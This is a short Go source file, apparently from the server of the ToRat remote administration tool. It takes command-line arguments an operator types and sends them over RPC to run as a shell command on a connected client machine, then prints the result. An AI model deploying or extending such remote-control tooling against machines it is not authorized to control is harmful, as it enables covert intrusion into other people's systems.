package server

import (
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/models"
)

func (client *activeClient) runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")
	var r string
	args := models.Cmd{
		Cmd:        command,
		Powershell: false,
	}

	err := client.RPC.Call("API.RunCmd", args, &r)
	if err != nil {
		c.Println(red(err))
	}

	c.Println(r)
}
